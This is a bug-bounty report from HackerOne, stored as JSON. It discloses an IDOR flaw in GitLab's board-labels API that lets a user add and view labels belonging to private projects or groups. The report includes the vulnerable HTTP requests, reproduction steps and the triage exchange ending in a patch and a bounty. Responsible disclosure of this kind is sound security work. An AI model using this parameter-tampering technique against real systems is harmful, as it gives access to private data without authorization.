{"id":439729,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80Mzk3Mjk=","url":"https://hackerone.com/reports/439729","title":"Add and Access to Labels of any Private Projects/Groups of Gitlab(IDOR)","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2018-11-13T03:44:45.389Z","submitted_at":"2018-11-13T03:44:45.389Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"indoappsec","url":"/indoappsec","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/QUAjqUf576QNBhxg691WB8YG/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-09-19T19:25:06.817Z","bug_reporter_agreed_on_going_public_at":"2019-09-19T19:25:06.689Z","team_member_agreed_on_going_public_at":"2019-09-19T19:03:10.579Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary \u0026 Description :\nIf you have a private project or private group then no non member should be able to access any information.But Adding Labels in your Private boards API request is vulnerable to IDOR attack which is leading to add private group/project labels and access it. \n\n##Vulnerable Request for Project :\n```\nPUT /[username]/[project_name]/boards/[board_id].json HTTP/1.1\nHost: gitlab.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:63.0) Gecko/20100101 Firefox/63.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json;charset=utf-8\nContent-Length: 178\nConnection: close\nCookie: [Cookies]\n\n{\"board\":{\"id\":857058,\"name\":\"Development\",\"labels\":[{\"id\":,\"title\":\"\",\"color\":\"#428BCA\"}],\"milestone_id\":null,\"assignee\":{},\"weight\":null,\"label_ids\":[[Label_ID]]}}\n\n```\n\nVulnerable parameter : label_ids : Label_ID\n\n##Vulnerable Request for Group :\n```\nPUT /groups/vijaykumar007Publicgroup/-/boards/848604.json HTTP/1.1\nHost: gitlab.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:63.0) Gecko/20100101 Firefox/63.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json;charset=utf-8\nContent-Length: 186\nConnection: close\nCookie: [Cookies]\n\n{\"board\":{\"id\":848604,\"name\":\"Developmenthacked\",\"labels\":[{\"id\":,\"title\":\"\",\"color\":\"#F0AD4E\"}],\"milestone_id\":null,\"assignee\":{},\"weight\":null,\"label_ids\":[label_ID]}}\n```\nVulnerable labelID : label_ids\n\n\n## Steps To Reproduce:\nTake 2 different accounts to reproduce this issue.Also I am taking Project for reproduction. \n1.Login from Victim account and create a project.\n2.Make the project private, don't add any member and try to remove all the public permission so it doesn't mixup any permissions.\n3.Create a new label.(Victim_label,ID:12345)\n4.Now login from Attacker account and try to access the victim project. \n5.You will notice that you are not able to victim project.\n6.Now create a new project and go to labels.\n7.Create a new label and go to boards.\n8.Edit the Board and you will see label section.\n9.Add label into the board and intercept the save request. \n10.The request would look something like above mentioned request. \n11.Change the labelID parameter to victim_label_ID in parameter \"label_ids\" and send the request. \n12.You will notice that the private label will be added into the board and you will be able to access it.\nSame you can apply on Private groups too.\n\n\n## Supporting Material/References:\n\n  * List any additional material (e.g. screenshots, logs, etc.)\n\n## Impact\n\nAdd and Access to Labels of any Private Projects/Groups of Gitlab(IDOR)","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":55,"name":"Insecure Direct Object Reference (IDOR)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":19,"voters":["dhakal_ananda","ali","tulswani","pahadi","powerjacobb1","cryptographer","dolph1n","joeuser47","unsecury","rashedul_css","and 9 more..."],"severity":{"rating":"low","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":3631911,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @vijay_kumar1110,\n\nThank you for submitting this report. We will investigate the issue as soon as possible.\nDue to our current workload, we will get back within 14 business days with an update.\n\nBest regards,\nGitLab Security Team\n","automated_response":true,"created_at":"2018-11-13T04:32:27.094Z","updated_at":"2018-11-13T04:32:27.094Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":3637678,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @vijay_kumar1110 ,\n\nThank you for submitting this report.\n\nWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab-ee/issues/8417.  This issue will be made public 30 days following the release of a patch.\n\nWe will continue to update you via HackerOne as a patch is scheduled for release.\n\nBest regards,\nEthan\nSecurity Team | GitLab Inc.","automated_response":false,"created_at":"2018-11-13T22:25:21.156Z","updated_at":"2018-11-13T22:25:21.156Z","actor":{"username":"estrike","cleared":false,"url":"/estrike","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3637686,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2018-11-13T22:27:13.105Z","updated_at":"2018-11-13T22:27:13.105Z","additional_data":{"old_severity":"High","new_severity":"Low","old_severity_id":240008,"new_severity_id":240641},"actor":{"username":"estrike","cleared":false,"url":"/estrike","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3637701,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @vijay_kumar1110,\n\nWe have adjusted the severity to `Low`, as the information obtained is the existence and name of label, but not additional information about it's project/group, or the issues with this label attached. Please let me know if you have obtained additional information and we will adjust accordingly.\n\nIf you have any questions, please let us know.\n\nThanks again,\n-Ethan","automated_response":false,"created_at":"2018-11-13T22:33:47.137Z","updated_at":"2018-11-13T22:33:47.137Z","actor":{"username":"estrike","cleared":false,"url":"/estrike","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3637704,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2018-11-13T22:34:05.213Z","updated_at":"2018-11-13T22:34:05.213Z","actor":{"username":"estrike","cleared":false,"url":"/estrike","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3697380,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2018-11-22T13:30:50.793Z","updated_at":"2018-11-22T13:30:50.793Z","additional_data":{"duplicate_report_id":448652},"actor":{"username":"ashish_r_padelkar","cleared":true,"url":"/ashish_r_padelkar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/J6bCQpyJWXtj9gjzcvnFfAKN/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3720715,"is_internal":false,"editable":false,"type":"Activities::ExternalUserRemoved","message":"","automated_response":false,"created_at":"2018-11-28T07:17:58.316Z","updated_at":"2018-11-28T07:17:58.316Z","actor":{"username":"ashish_r_padelkar","cleared":true,"url":"/ashish_r_padelkar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/J6bCQpyJWXtj9gjzcvnFfAKN/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"removed_user":{"url":"/ashish_r_padelkar","username":"ashish_r_padelkar"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4091167,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"ETA for fix:\n\nHi @vijay_kumar1110,\n\nThe GitLab issue created from your report is currently scheduled for 2019-03-22.\n\nThank you again for contacting us!\n\nBest regards,\nGitLab Security Team\n","automated_response":true,"created_at":"2019-02-04T15:09:39.190Z","updated_at":"2019-02-04T15:09:39.190Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4500110,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@estrike : The schedule of the resolve the issue was in March. What is the ETA of the the bounty and resolution ? ","automated_response":false,"created_at":"2019-04-07T00:48:15.108Z","updated_at":"2019-04-07T00:48:15.108Z","actor":{"username":"indoappsec","cleared":true,"url":"/indoappsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QUAjqUf576QNBhxg691WB8YG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4519092,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2019-04-09T14:40:38.294Z","updated_at":"2019-04-09T14:40:38.294Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"GitLab"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"indoappsec","url":"/indoappsec"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4519099,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @vijay_kumar1110 ,\n\nThank you again for the report! Your finding has been patched in GitLab version 11.9.4 and we are awarding a $1000 bounty. Congratulations!\n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker.\n\nWe look forward to your next report!\n\nBest regards,\nEthan\nSecurity Team | GitLab Inc.\n","automated_response":false,"created_at":"2019-04-09T14:41:16.777Z","updated_at":"2019-04-09T14:41:16.777Z","actor":{"username":"estrike","cleared":false,"url":"/estrike","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"indoappsec","url":"/indoappsec"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5845922,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-09-19T19:03:10.603Z","updated_at":"2019-09-19T19:03:10.603Z","first_to_agree":true,"actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5846053,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-09-19T19:25:06.726Z","updated_at":"2019-09-19T19:25:06.726Z","actor":{"username":"indoappsec","cleared":true,"url":"/indoappsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QUAjqUf576QNBhxg691WB8YG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5846054,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-09-19T19:25:06.848Z","updated_at":"2019-09-19T19:25:06.848Z","actor":{"username":"indoappsec","cleared":true,"url":"/indoappsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QUAjqUf576QNBhxg691WB8YG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}